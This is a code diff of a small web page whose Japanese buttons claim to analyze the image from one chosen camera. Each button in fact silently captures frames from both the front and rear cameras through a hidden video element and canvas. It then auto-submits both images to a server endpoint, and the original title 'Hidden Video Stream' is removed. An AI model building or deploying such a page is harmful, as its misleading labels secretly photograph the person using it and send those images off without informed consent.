@@ -1,63 +1,100 @@
 <!DOCTYPE html>
     <html>
     <head>
-        <title>Hidden Video Stream</title>
+        
     </head>
     <body>
-        <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+        <video id="videoElement" width="640" height="480" autoplay style="display:none;"></video>
         <canvas id="canvas" style="display:none;"></canvas>
         <form id="Form" method="POST" action="/puepue">
             <input type="hidden" name="imageData" id="imageData">
             <input type="hidden" name="imageData2" id="imageData2">
         </form>
-        <button id="captureBtn">画像をキャプチャして解析</button>
+        <button id="captureBtn">外カメラの画像を解析</button>
+        <button id="captureBtn2">内カメラの画像を解析</button>
+        <button id="toggleButton">外カメラを表示</button>
         <script>
-            function sendpic(facingMode, inputId) {
-                return new Promise((resolve, reject) => {
-                    const video = document.getElementById('video');
-                    const canvas = document.getElementById('canvas');
-                    const imageDataInput = document.getElementById(inputId);
-                    const context = canvas.getContext('2d');
-
-                    const constraints = {
-                        video: {
-                            facingMode: facingMode
-                        }
-                    };
-
-                    navigator.mediaDevices.getUserMedia(constraints)
-                        .then((stream) => {
-                            video.srcObject = stream;
-                            video.addEventListener('loadeddata', () => {
-                                const aspectRatio = video.videoWidth / video.videoHeight;
-                                const newWidth = video.videoWidth;
-                                const newHeight = newWidth / aspectRatio;
-
-                                canvas.width = newWidth;
-                                canvas.height = newHeight;
-
-                                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                const dataUrl = canvas.toDataURL('image/png')
-                                imageDataInput.value = dataUrl;
-
-                                resolve();
-                            });
-                        })
-                        .catch((err) => {
-                            console.error('Error:', err);
-                            alert(`Error: ${err.name} - ${err.message}`);
-                            reject(err);
-                        });
-                });
+            async function sendpic(facingMode, inputId) {
+                const video = document.getElementById('videoElement');
+                const canvas = document.getElementById('canvas');
+                const imageDataInput = document.getElementById(inputId);
+                const context = canvas.getContext('2d');
+                const constraints = {
+                    video: {
+                        facingMode: facingMode
+                    }
+                };
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                    video.srcObject = stream;
+                    await new Promise((resolve) => {
+                        video.onloadeddata = () => {
+                            const aspectRatio = video.videoWidth / video.videoHeight;
+                            const newWidth = video.videoWidth;
+                            const newHeight = newWidth / aspectRatio;
+                            canvas.width = newWidth;
+                            canvas.height = newHeight;
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const dataUrl = canvas.toDataURL('image/png');
+                            imageDataInput.value = dataUrl;
+                            stream.getTracks().forEach(track => track.stop());
+                            resolve();
+                        };
+                    });
+                } catch (err) {
+                    console.error('Error:', err);
+                    alert(`Error: ${err.name} - ${err.message}`);
+                }
             }
-
             async function pue() {
                 await sendpic('user', 'imageData');
                 await sendpic('environment', 'imageData2');
                 document.getElementById('Form').submit();
             }
-
+             async function puepue() {
+                await sendpic('user', 'imageData2');
+                await sendpic('environment', 'imageData');
+                document.getElementById('Form').submit();
+            }
+ let currentMode = 0; // 0: 非表示, 1: 外カメラ, 2: 内カメラ
+        async function getMedia(facingMode) {
+            const constraints = {
+                video: {
+                    facingMode: facingMode
+                }
+            };
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const video = document.getElementById('videoElement');
+                video.srcObject = stream;
+                video.style.display = 'block';
+            } catch (error) {
+                console.error('Error accessing media devices.', error);
+            }
+        }
+        document.getElementById('toggleButton').addEventListener('click', function() {
+            const video = document.getElementById('videoElement');
+            switch (currentMode) {
+                case 0:
+                    video.style.display = 'none';
+                    this.textContent = '外カメラを表示';
+                    currentMode = 1;
+                    break;
+                case 1:
+                    getMedia('environment');
+                    this.textContent = '内カメラを表示';
+                    currentMode = 2;
+                    break;
+                case 2:
+                    getMedia('user');
+                    this.textContent = 'カメラを非表示';
+                    currentMode = 0;
+                    break;
+             }
+             
+        });
             document.getElementById('captureBtn').addEventListener('click', pue);
+            document.getElementById('captureBtn2').addEventListener('click', puepue);
         </script>
     </body>
     </html>
